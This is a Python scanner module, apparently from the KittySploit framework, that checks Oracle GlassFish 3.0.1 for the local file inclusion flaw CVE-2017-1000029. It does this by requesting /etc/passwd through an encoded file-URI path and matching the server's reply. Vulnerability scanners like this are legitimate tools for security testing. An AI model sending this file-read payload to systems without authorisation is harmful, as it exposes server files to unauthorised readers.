#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Oracle GlassFish Server Open Source Edition 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Oracle GlassFish Server Open Source Edition 3.0.1 - Local File Inclusion Detection',
        'description': 'Oracle GlassFish Server Open Source Edition 3.0.1 (build 22) is vulnerable to unauthenticated local file inclusion vulnerabilities that allow remote attackers to request arbitrary files on the server.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'glassfish', 'oracle', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18784',
            'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2016-011/?fid=8037',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-1000029',
        ],
        'cve': 'CVE-2017-1000029',
    }

    def run(self):
        r = self.http_request(method="GET", path='/resource/file%3a///etc/passwd/', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Oracle GlassFish Server Open Source Edition 3.0.1 - Local File Inclusion detected",
                path='/resource/file%3a///etc/passwd/',
            )
            return True
        return False

